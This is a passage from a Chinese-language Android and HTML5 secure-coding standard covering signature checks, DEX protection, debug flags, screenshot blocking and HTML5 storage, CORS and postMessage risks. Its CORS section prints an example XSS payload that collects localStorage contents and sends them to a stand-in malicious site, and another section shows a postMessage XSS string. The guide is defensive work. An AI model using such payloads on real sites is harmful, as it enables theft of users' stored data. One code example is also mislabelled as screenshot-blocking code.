      if (je.getName().startsWith("META-INF/")) {
        continue;
      }
      java.security.cert.Certificate[] localCerts = loadCertificates(
          jarFile, je, readBuffer);
      if (certs == null) {
        certs = localCerts;
      } else {
        for (int i = 0; i < certs.length; i++) {
          boolean found = false;
          for (int j = 0; j < localCerts.length; j++) {
            if (certs[i] != null
                && certs[i].equals(localCerts[j])) {
              found = true;
              break;
            }
          }
          if (!found || certs.length != localCerts.length) {
            jarFile.close();
            return null;
          }
        }
      }
    }
    jarFile.close();
  return new String(toChars(certs[0].getEncoded()));
  } catch (Exception e) {
    e.printStackTrace();
  }
  return null;
}
```

##### 4.8.3.2.重要函数逻辑安全

* 【规范要求】

程序中重要的逻辑函数建议使用NDK技术通过c/c++代码实现。

* 【详情说明】

因为APK本身未进行专业加固保护，存在被baksmali/apktool/dex2jar直接反编译获取程序java代码的风险，建议程序的重要函数使用android ndk技术通过c/c++实现，将重要函数编译到so库中，能够提高重要函数的逻辑安全强度。

##### 4.8.3.3.动态加载DEX文件检测

* 【规范要求】

如在应用程序中，存在动态加载DEX文件功能代码，应对动态加载的DEX文件应进行完整性验证。

* 【详情说明】

Android系统提供了一种类加载器DexClassLoader技术，可在程序运行时动态加载运行JAR文件或APK文件内的DEX文件。动态加载DEX文件的安全风险源于：Anroid4.1之前的系统版本允许APP动态加载应用自身具有读写权限文件(如sdcard)下的DEX文件，因此不能够保证应用免遭恶意代码的劫持注入。如果APP外部加载的DEX文件没做完整性校验，所加载的DEX文件极易被恶意应用所劫持或代码注入。一旦APP外部的DEX被劫持，将会执行攻击者的恶意代码，进一步实施欺诈、获取账号密码或其他恶意行为。

### 4.9.逆向工程

-------

#### 4.9.1.定义

“逆向工程”指的对Android APP利用使用的一些不安全的配置，通过使用ida pro、apktool等逆向工具对应用程序数据进行非法备份、代码非法篡改等行为。

#### 4.9.2.风险

Android编码规范中“逆向工程”会造成的风险包括：核心功能代码泄露、核心代码篡改、内存调试等风险。

#### 4.9.3.防范方法

-------

#### 4.9.3.1.Debuggable项设置

* 【规范要求】

发布版程序，应显示关闭调试属性。将AndroidManifest.xml中application的debuggable属性显示设置为false。：

* 【详情说明】

在AndroidManifest.xml中可定义android:debuggable属性，如果该属性设置为true，这表示应用程序运行调试模式运行。app被恶意程序调试运行时，可能导致代码执行被跟踪、敏感信息泄漏等问题。应显示的设置android:debuggable="false"。

* 【代码示例】

```java
android:debuggable="false"
```

##### 4.9.3.2.DEX文件安全

* 【规范要求】

对DEX文件进行加壳保护。

* 【详情说明】

DEX未进行保护会被攻击者通过baksmali/apktool/dex2jar等反编译工具逆向出代码，造成核心功能代码泄露、核心代码篡改、内存调试等风险。

### 4.10.多余的功能

-------

#### 4.10.1.定义

“多余的功能”指开发人员将隐藏的后门程序功能或其他内部调试功能发布到生产环境中。

#### 4.10.2.风险

Android编码规范中“多余的功能”会造成的风险包括：敏感数据窃取、未经授权功能访问等。

#### 4.10.3.防范方法

-------

##### 4.10.3.1.测试数据移除检测

* 【规范要求】

发布版本应对程序中所有测试数据、测试方法进行统一删除。

* 【详情说明】

如果应用中含有残留的测试数据，可能会造成测试账号或者测试信息外泄，如果测试数据中残留有重要数据，则会造成重要数据泄露。

##### 4.10.3.2.内网信息残留检测

【规范要求】

发布版本应对程序中所有的内网数据进行统一删除。

【详情说明】

通过检测是否包含内网URL地址，判断发布包中是否包含测试数据。残留的测试数据，例如URL地址、测试账号、密码等可能会被盗取并恶意使用在正式服务器上进行攻击，例如账号重试，攻击安全薄弱的测试服务器以获取服务器安全漏洞或逻辑漏洞。

### 4.11.其他

-------

#### 4.11.1.定义

除了以上在OWASP Mobile Top 10 2016中分析的十项规范外，移动Android APP开发的过程中还应用注意部分手机厂商提供的默认功能导致的安全风险，例如：手机设备提供的屏幕截屏/录频功能产生的密码泄露风险；使用设备的默认键盘键盘或者第三方未知键盘造成的敏感数据输入泄露风险。

#### 4.11.2.风险

造成的风险包括：APP输入的敏感数据被注入键盘钩子窃取、APP输入的敏感数据在回显时被窃取、登录业务中相关提醒泄露敏感信息。

#### 4.11.3.防范方法

-------

##### 4.11.3.1.禁用屏幕录像功能

* 【规范要求】

Activity需设置WindowManager.LayoutParams.FLAG_SECURE来防止截屏录屏操作。

* 【详情说明】

在敏感信息输入、显示页面，禁用截屏录像功能。

* 【代码示例】

相关应用层提供的禁止屏幕截屏/录频的代码：
getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);

##### 4.11.3.2.登录失败提示混淆

* 【规范要求】

登录失败提示语句需统一进行模糊失败提示。

* 【详情说明】

错误的提示包括：“登录账号错误，请重新输入”或“登录密码错误，请重新输入”；安全规范类提示包括：“账号或密码错误，请重新输入”。

##### 4.11.3.3.敏感数据显示（输出）与输入检测

* 【规范要求】

在敏感/重要数据输入时使用安全键盘。

* 【详情说明】

客户端的敏感信息输入界面，如登录界面、注册界面、支付界面等，用户在输入敏感信息与显示（输出）过程中，如果使用第三方未知键盘或系统键盘的话可能存在被数据拦截与输入监听的风险导致敏感数据泄露。应使用安全键盘进行敏感信息的输入。

### 4.12.Html5安全

-------

#### 4.12.1.定义

Html5安全从客户端数据储存安全、跨域通信安全、Web worker使用安全、新标签postMessage使用安全、预防拖拽劫持导致的攻击等反面分析了Html5 APP开发过程中应用注意的事项。

#### 4.12.2.风险

Html5 APP不规范的开发会导致的问题包括：敏感信息泄露、跨目录攻击、DNS欺骗攻击、恶意代码栖息等风险。

#### 4.12.2.1.客户端存储安全

* 【规范要求】

对于Html5客户端储存安全需要注意的是：不存放敏感信息、选择合适的域存放信息。比如一次性信息存放在sessionstorage中，并对存放的信息进行服务端加密。

* 【详情说明】

以前版本的HTML语言中，仅允许将Cookies作为本地信息进行存储且分配空间相对较小。客户端上往往只存储简单的会话ID等少量信息，当用户需要多次访问相同数据时，需要多次向服务器端发送请求获取，因此，大大降低了WEB的访问性能。

随着WEB应用复杂度和数据量的不断增大，访问性能成为了制约发展的重要瓶颈。为此，HTML5引进了LocalStorage，允许浏览器在客户端存储大量数据，并允许使用新类型的数据存储。这一调整虽然大大提高了访问性能，但却带来了巨大的安全隐患。在这样的机制下，敏感数据将被存储在客户端，攻击者只需要通过物理访问或者破坏客户端等简单方法，就能够轻松地获得敏感数据。

使用LocalStorage代替Cookies做身份验证，Cookies有HTTPONLY的保护，而LocalStorage没有任何保护机制，一旦有XSS漏洞，使用LocalStorage存储的数据很容易被攻击者获取。LocalStorage采用明文存储，如果用户不主动删除，数据将永久存在，且本地存储容易受到DNS欺骗攻击。LocalStorage存储没有路径概念，容易受到跨目录攻击。由于localStorage的存储空间多达5M，攻击者可以把蠕虫的shellcode代码存储在本地。

#### 4.12.2.2.跨域通信安全

* 【规范要求】

Html5的跨域通信安全需要注意：不要对Access–Control-Allow-Origin使用 *、要对跨域请求验证session信息、严格审查请求信息，比如请求参数、http头信息等。

* 【详情说明】

以前版本的HTML语言中的同源策略（Same-Origin Policy）对JavaScript代码能够访问的页面内容做了很重要的限制，即JavaScript只能访问文档中包含它并在同一域下的内容。例如，在a.com下的页面中包含的JavaScript 代码，不能访问在b.com域名下的页面内容；甚至不同的子域名之间的页面也不能通过JavaScript代码互相访问。
而HTML5为实现跨源资源共享，提供了一种跨域通信机制绕过同源政策。这一机制将允许不同域的服务器能够在Web浏览器的iframe间进行通信，这样一来，攻击者就能够滥用这个功能以获得敏感数据。

* 【代码示例】

如果网站存在XSS漏洞，攻击者的注入代码：

```JavaScript
<script>
   var i =0;
   var str = “”;
   while(localStorage.key(i) != null)
   {
      var key = localStorage.key(i);
       str += key +”:” + localStorage. getItem(key);
       i++;
}
document.location=http://your-maliciours-site.com?stolen=+str;
<script>
```

-------

##### 4.12.2.3.Web worker安全

* 【规范要求】

对于Web workder预防僵尸网络风险需要注意的是：对访问的站点加入黑/白名单策略。对黑名单站点进行访问预警，对访问的客户端资源占用情况进行监控，发现某个页面资源占用反常需进行访问预警。

* 【详情说明】

Html5“解决”了js单线程问题，提出了Web worker机制，它为js提供多线程支持，但是多线程带来了一个非常可怕的危险-僵尸网络。Web worker造成的僵尸网络就是在用户不知情的情况下，使用pc端的资源往外发送大量的请求，如果受控的客户端（僵尸）够多，并且针对某一个目标发送，可以造成应用层的DDOS。

* 【代码示例】

Web workder的使用代码：

```JavaScript
var worker = new Worker("worker.js");
worker.postMessage("hello world");
worker.onmessage = function(){}
```

##### 4.12.2.4.新标签postMessage安全

* 【规范要求】

使用postMessage标签时，在onmessage中不能直接使用innerHTML类似的语句添加或者修改网页。

* 【详情说明】

postMessage是web worker中的一个函数，它的作用是主线程给新线程post数据用的，并且postMessage是不通过服务器的，那么很有可能造成DOM-based XSS。

* 【代码示例】

新标签postMessage的利用代码：

```JavaScript
postMessage("<script>alert(1)</script>");
worker.onmessage = function(e) {
    document.getElementById("test").innerHTML = e.data;
}
```

##### 4.12.2.5.预防拖放劫持攻击

* 【规范要求】

通过在js代码中设置top.location=window.location.href预防拖放劫持攻击。

* 【详情说明】

拖放劫持可定义为点击劫持技术(Clickjacking)与HTML5拖放事件的组合。点击劫持攻击只涉及在隐藏框中的点击操作，其攻击范围有所限制。而拖放劫持模式将劫持的用户操作由单纯的点击扩展到了拖放行为。在现在的Web应用中，有大量需要用户采用拖放完成的操作，因此，拖放劫持大大扩展了点击劫持的攻击范围。

此外，在浏览器中拖放操作是不受同源策略限制的，用户可以把一个域的内容拖放到另外一个域；因此，突破同源策略限制的拖放劫持可以演化出更为广泛的攻击形式，能够突破多种防御。

* 【代码示例】

相关应用层提供的禁止屏幕截屏/录频的代码：

```java
If(top != window)
    top.location = window.location.href;
```
